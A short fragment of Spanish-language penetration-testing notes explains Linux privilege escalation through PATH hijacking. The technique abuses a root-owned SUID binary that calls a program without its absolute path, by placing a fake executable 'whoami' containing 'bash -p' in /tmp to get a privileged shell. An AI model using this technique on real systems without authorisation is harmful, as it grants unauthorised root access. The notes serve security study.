...
NOTA:
	- Ser SUID y propiedad de root
		- Ejecutar otro programa sin indicar la ruta absoluta
```
...
```bash 
# Primero buscar por el dir /tmp/ y despues por las rutas del 'PATH'
# La prioridad de busqueda es de izquierda a derecha 
...
```bash 
# Crear el archivo en el dir /tmp/, en este dir se tiene privilegios de lectura y escritura

❯ nvim whoami
❯ chmod +x whoami 

	# Dentro del file, podemos colocar lo siguiente:
	bash -p      # Ejecutar una bash p = privilege
```
